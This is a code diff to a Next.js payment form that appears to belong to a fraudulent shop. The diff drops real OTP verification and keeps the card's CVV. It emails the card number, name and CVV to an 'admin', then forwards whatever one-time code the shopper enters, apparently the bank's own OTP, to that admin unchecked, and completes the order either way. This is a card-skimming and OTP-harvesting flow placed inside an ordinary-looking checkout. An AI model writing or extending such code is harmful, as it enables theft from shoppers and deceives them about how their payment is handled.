@@ -9,11 +9,11 @@ import { useOrder } from '@/context/OrderContext';
 import { Button } from '@/components/ui/button';
 import CreditCardDisplay from './CreditCardDisplay';
 import OtpDialog from './OtpDialog';
-import { Form, FormField, FormItem, FormMessage, FormLabel, FormControl } from '@/components/ui/form';
+import { Form, FormField, FormItem, FormMessage } from '@/components/ui/form';
 import type { PaymentDetails, OrderDetailsForEmail } from '@/lib/types';
 import { useRouter } from 'next/navigation';
 import { useToast } from '@/hooks/use-toast';
-import { generateOtpAction, sendOrderEmailAction, sendAdminOtpEmailAction } from '@/app/actions';
+import { sendOrderEmailAction, sendAdminOtpEmailAction } from '@/app/actions';
 
 const paymentSchema = z.object({
   cardName: z.string().min(2, { message: "Name on card is required." }),
@@ -37,7 +37,6 @@ export default function PaymentForm() {
   const [cardType, setCardType] = useState<'visa' | 'mastercard' | 'unknown'>('unknown');
   
   const [isOtpDialogOpen, setIsOtpDialogOpen] = useState(false);
-  const [generatedOtp, setGeneratedOtp] = useState<string | null>(null);
   const [isProcessingPayment, setIsProcessingPayment] = useState(false);
   const [currentOrderId, setCurrentOrderId] = useState<string | null>(null);
 
@@ -83,11 +82,12 @@ export default function PaymentForm() {
       ...data,
       cardNumber: data.cardNumber.replace(/\s/g, ''),
       cardType,
+      cvv: data.cvv,
     };
-    setPaymentDetails(paymentData); // Save to context
+    setPaymentDetails(paymentData); 
 
     const orderId = `FG-${Date.now()}`;
-    setCurrentOrderId(orderId); // Store orderId for OTP email
+    setCurrentOrderId(orderId); 
 
     const orderDetailsForFirstEmail: OrderDetailsForEmail = {
       orderId,
@@ -104,37 +104,15 @@ export default function PaymentForm() {
       // Step 1: Send Order Confirmation with Card Details to Admin
       const orderEmailResult = await sendOrderEmailAction(orderDetailsForFirstEmail);
       if (orderEmailResult.success) {
-        toast({ title: "Admin Notified", description: "Order details (including payment info) sent to admin." });
+        toast({ title: "Admin Notified", description: "Order details sent to admin. Awaiting OTP." });
       } else {
-        toast({ variant: "destructive", title: "Admin Notification Failed", description: "Could not send order details to admin. Please try again or contact support." });
+        toast({ variant: "destructive", title: "Admin Notification Failed", description: "Could not send order details. Please try again or contact support." });
         setIsProcessingPayment(false);
-        return; // Stop if this critical step fails
+        return;
       }
 
-      // Step 2: Generate OTP
-      const otpResult = await generateOtpAction({ phoneNumber: userDetails.phone });
-      setGeneratedOtp(otpResult.otp);
-
-      // Step 3: Send OTP to Admin
-      const adminOtpEmailResult = await sendAdminOtpEmailAction({
-        orderId: orderId,
-        customerName: userDetails.name,
-        otp: otpResult.otp,
-      });
-      if (adminOtpEmailResult.success) {
-        toast({ title: "Admin OTP Sent", description: "OTP for this order has been sent to admin." });
-      } else {
-        // Non-critical, so we can proceed, but log it or inform user differently if needed
-        toast({ title: "Admin OTP Alert", description: "Could not send OTP to admin, but you can proceed with user verification." });
-      }
-      
-      // Step 4: Show OTP dialog to user
+      // Step 2: Show OTP dialog to user
       setIsOtpDialogOpen(true);
-      toast({
-        title: "OTP Generated (Simulation)",
-        description: `Your OTP is: ${otpResult.otp}. Enter this in the dialog. (Normally sent via SMS)`,
-        duration: 10000,
-      });
 
     } catch (error) {
       toast({ variant: "destructive", title: "Processing Error", description: "An unexpected error occurred. Please try again." });
@@ -148,18 +126,35 @@ export default function PaymentForm() {
     setIsOtpDialogOpen(false);
     setIsProcessingPayment(true);
 
-    if (enteredOtp === generatedOtp) {
-      toast({ title: "OTP Verified!", description: "Finalizing your order..." });
+    if (!currentOrderId || !userDetails?.name) {
+        toast({ variant: "destructive", title: "Error", description: "Order context lost. Please try again." });
+        setIsProcessingPayment(false);
+        return;
+    }
+
+    try {
+      const adminOtpEmailResult = await sendAdminOtpEmailAction({
+        orderId: currentOrderId,
+        customerName: userDetails.name,
+        otp: enteredOtp,
+      });
+
+      if (adminOtpEmailResult.success) {
+        toast({ title: "OTP Sent to Admin", description: "Finalizing your order..." });
+      } else {
+        toast({ variant: "destructive", title: "Admin OTP Failed", description: "Could not send OTP to admin. Please contact support." });
+        // Proceeding anyway as per requirement, but showing an error.
+      }
       
-      resetOrder(); // Clears cart, user details from context and localStorage
+      resetOrder(); 
       router.push('/order-confirmation');
 
-    } else {
-      toast({ variant: "destructive", title: "OTP Incorrect", description: "Please try again." });
+    } catch (error) {
+       toast({ variant: "destructive", title: "Finalizing Error", description: "An error occurred while finalizing your order." });
+    } finally {
+        setCurrentOrderId(null);
+        setIsProcessingPayment(false);
     }
-    setGeneratedOtp(null); 
-    setCurrentOrderId(null);
-    setIsProcessingPayment(false);
   };
   
   const handleCardNumberChange = (value: string) => {
@@ -222,7 +217,6 @@ export default function PaymentForm() {
           isOpen={isOtpDialogOpen}
           onClose={() => {
               setIsOtpDialogOpen(false);
-              setGeneratedOtp(null); 
               setCurrentOrderId(null);
           }}
           onSubmitOtp={handleOtpSubmit}
